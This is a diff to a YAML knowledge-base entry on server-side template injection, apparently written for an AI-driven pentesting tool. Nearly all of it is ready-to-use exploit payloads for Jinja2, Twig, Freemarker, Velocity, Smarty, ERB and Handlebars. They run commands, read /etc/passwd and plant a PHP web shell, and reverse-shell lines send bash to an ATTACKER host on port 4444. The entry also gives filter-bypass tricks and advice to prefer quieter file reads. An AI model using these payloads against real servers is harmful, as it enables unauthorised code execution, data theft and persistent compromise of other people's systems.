@@ -1,77 +1,107 @@
 id: SSTI
-name: Server-Side Template Injection
+name: Server-Side Template Injection — Comprehensive
 cwe:
 - CWE-1336
+- CWE-94
 owasp: A03:2021 Injection
-severity_range: High - Critical
-description: User input is embedded into server-side templates and evaluated, potentially allowing remote code execution.
+severity_range: Critical
+description: SSTI occurs when user input is concatenated into a server-side template that gets rendered. Different engines
+  have different syntax but most lead to RCE. Detection via math expressions; exploitation via engine-specific class navigation
+  (Python) or scope escape (Java/Ruby).
 detection:
-  payloads:
-    polyglot_detection:
-    - ${{<%[%'"}}%\.
-    - '{{7*7}}'
-    - ${7*7}
-    - <%= 7*7 %>
-    - '#{7*7}'
-    - '{7*7}'
-    - '{{7*''7''}}'
-    jinja2:
-    - '{{7*7}}'
-    - '{{config}}'
-    - '{{self.__class__.__mro__}}'
-    - '{{''''.__class__.__mro__[1].__subclasses__()}}'
-    - '{{request.application.__globals__.__builtins__.__import__(''os'').popen(''id'').read()}}'
-    - '{% for x in ().__class__.__base__.__subclasses__() %}{% if ''warning'' in x.__name__ %}{{x()._module.__builtins__[''__import__''](''os'').popen(''id'').read()}}{%
-      endif %}{% endfor %}'
-    twig:
-    - '{{7*7}}'
-    - '{{_self.env.registerUndefinedFilterCallback(''exec'')}}{{_self.env.getFilter(''id'')}}'
-    freemarker:
-    - ${7*7}
-    - <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-    velocity:
-    - '#set($x=7*7)${x}'
-    - '#set($rt=$class.forName(''java.lang.Runtime''))#set($proc=$rt.getRuntime().exec(''id''))'
-    smarty:
-    - '{php}echo `id`;{/php}'
-    - '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[''cmd'']); ?>",self::clearConfig())}'
-    mako:
-    - ${7*7}
-    - <%import os%>${os.popen('id').read()}
-    pebble:
-    - '{{7*7}}'
-    - '{% set cmd = ''id'' %}{% set bytes = (1).TYPE.forName(''java.lang.Runtime'').methods[6].invoke(null,null).exec(cmd)
-      %}'
-    erb:
-    - <%= 7*7 %>
-    - <%= system('id') %>
-    - <%= `id` %>
-    handlebars:
-    - '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with
-      string.split as |codelist|}}{{this.pop}}{{this.push "return require(''child_process'').execSync(''id'');"}}{{this.pop}}{{#each
-      conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
   strategy:
-  - 1. Inject {{7*7}} and ${7*7} and <%= 7*7 %> in all inputs
-  - 2. If response contains '49', template injection confirmed
-  - 3. Identify the template engine using engine-specific probes
-  - '4. Jinja2: {{config}} returns Flask config object'
-  - '5. Twig: {{_self}} returns template info'
-  - '6. Freemarker: ${.version} returns version'
-  - 7. Use engine-specific RCE payloads for escalation
-  - 8. Test email templates, PDF generators, error pages, preview features
-escalation:
-  path: detect_engine → confirm_execution → read_file → rce
-  rce_confirmation: Execute 'id' or 'whoami' and verify output in response
-  file_read: Read /etc/passwd or application config files
-  reverse_shell: Establish reverse shell via os.popen or Runtime.exec
-evidence_needed: 'Server-side code execution proof: math evaluation (49 for 7*7), file content, or command output in response'
+  - '1. Send polyglot probe: ${{<%[%''"}}%\'
+  - 2. If errors appear, identify engine from error message
+  - 3. Send engine-specific math probes (7*7=49)
+  - 4. Confirm with second math (8*8=64) — eliminates false positives
+  - 5. Test engine-specific RCE payloads
+  engine_detection:
+    jinja2_flask: '{{7*7}} → 49 AND {{7*''7''}} → 7777777'
+    twig_php: '{{7*7}} → 49 AND {{7*''7''}} → 49'
+    freemarker_java: ${7*7} → 49 AND ${"foo"?upper_case} → FOO
+    velocity_java: '#set($x=7*7)$x → 49'
+    smarty_php: '{7*7} → 49 AND {$smarty.version}'
+    erb_ruby: <%= 7*7 %> → 49
+    handlebars_node: '{{#with ''a'' as |x|}}{{lookup x.constructor.constructor ''return 7*7''}}{{/with}} → 49'
+    tornado_python: '{{7*7}} → 49 AND {% import time %}{{time.time()}}'
+    mako_python: ${7*7} → 49 AND ${self.module.cache.util.os}
+    pebble_java: '{{7*7}} → 49'
+    thymeleaf_java: ${7*7} → 49 (Spring; restricted by default)
+  attack_classes:
+    jinja2_rce:
+      description: Python class navigation from any object to os.system.
+      payloads:
+      - '{{''''.__class__.__mro__[1].__subclasses__()}}'
+      - '{{''''.__class__.__mro__[1].__subclasses__()[INDEX](''id'', shell=True, stdout=-1).communicate()}}'
+      - '{{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}'
+      - '{{cycler.__init__.__globals__.os.popen(''id'').read()}}'
+      - '{{lipsum.__globals__[''os''].popen(''id'').read()}}'
+      - '{{request.application.__globals__.__builtins__.__import__(''os'').popen(''id'').read()}}'
+      - '{{self.__init__.__globals__.__builtins__.exec(''print(__import__("os").popen("id").read())'')}}'
+      severity: critical
+    twig_rce:
+      description: Twig with PHP filter or registry abuse.
+      payloads:
+      - '{{[''id'']|filter(''system'')}}'
+      - '{{[''cat /etc/passwd'']|map(''passthru'')|join}}'
+      - '{{_self.env.registerUndefinedFilterCallback(''exec'')}}{{_self.env.getFilter(''id'')}}'
+      severity: critical
+    freemarker_rce:
+      description: Java code execution via Execute or static field access.
+      payloads:
+      - <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
+      - ${'freemarker.template.utility.Execute'?new()('id')}
+      - <#assign value='freemarker.template.utility.ObjectConstructor'?new()>${value('java.lang.ProcessBuilder',['id'])}
+      severity: critical
+    velocity_rce:
+      description: Velocity allows Java reflection.
+      payloads:
+      - '#set($e=''exp'')#set($exec=$e.getClass().forName(''java.lang.Runtime'').getMethod(''exec'',$e.getClass()).invoke($e.getClass().forName(''java.lang.Runtime'').getMethod(''getRuntime'').invoke(null),''id''))$exec'
+      severity: critical
+    smarty_rce:
+      description: Smarty {php} block or PHP function call.
+      payloads:
+      - '{php}system(''id'');{/php}'
+      - '{system(''id'')}'
+      - '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,''<?php system($_GET[0]);?>'',self::clearConfig())}'
+      severity: critical
+    erb_rce:
+      description: Ruby ERB with native methods.
+      payloads:
+      - <%= system('id') %>
+      - <%= `id` %>
+      - <%= IO.popen('id').readlines() %>
+      - <%= File.open('/etc/passwd').read %>
+      severity: critical
+    handlebars_rce:
+      description: Handlebars sandbox escape via constructor chaining.
+      payloads:
+      - '{{#with ''constructor'' as |c|}}{{#with c.constructor as |co|}}{{co.constructor(''return process'')()}}{{/with}}{{/with}}'
+      severity: critical
+exploitation:
+  rce_via_jinja2:
+  - '{{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}'
+  - '{{request.application.__globals__.__builtins__.__import__(''os'').popen(''id'').read()}}'
+  - 'Read files: {{config.__class__.__init__.__globals__[''__builtins__''].open(''/etc/passwd'').read()}}'
+  reverse_shell:
+  - 'Jinja2: {{config.__class__.__init__.__globals__[''os''].popen(''bash -i >& /dev/tcp/ATTACKER/4444 0>&1'').read()}}'
+  - 'ERB: <%= IO.popen([''bash'', ''-c'', ''bash -i >& /dev/tcp/ATTACKER/4444 0>&1'']) %>'
+  filter_bypass:
+  - 'If {{ }} filtered: try {%for x in [].__class__.__base__.__subclasses__()%}{%if x.__name__==''catch_warnings''%}{{x()._module.__builtins__[''__import__''](''os'').popen(''id'').read()}}{%endif%}{%endfor%}'
+  - 'If __ filtered: use attr() — {{config|attr(''__class__'')|attr(''__init__'')...}}'
+  - 'If quotes filtered: use request.args.x with chr() concatenation'
 ai_research_hints:
-- Check PDF generation endpoints — they often use templates
-- Test email template preview/customization features
-- Look for 'preview' or 'render' parameters in URLs
-- Test error pages that might reflect input through templates
-- Check if template sandbox is enforced and find sandbox escapes
+- Test ALL parameters — SSTI often hidden in headers (X-Forwarded-For), file uploads (filename), email signatures
+- Server-side PDF/Email/Report generators are highest-yield SSTI targets
+- Even WYSIWYG editors may have SSTI in their template field
+- Check error pages — frameworks often render dev error pages with template engines
+- If math evaluates but RCE payloads fail, you're in a sandbox — try sandbox escape per engine
+- If sandbox is tight, file read may still work (less suspicious than RCE)
+tools:
+- tplmap (auto-exploit)
+- SSTImap
+- OOB callback for blind SSTI
 references:
-- https://portswigger.net/web-security/server-side-template-injection
+- https://portswigger.net/research/server-side-template-injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
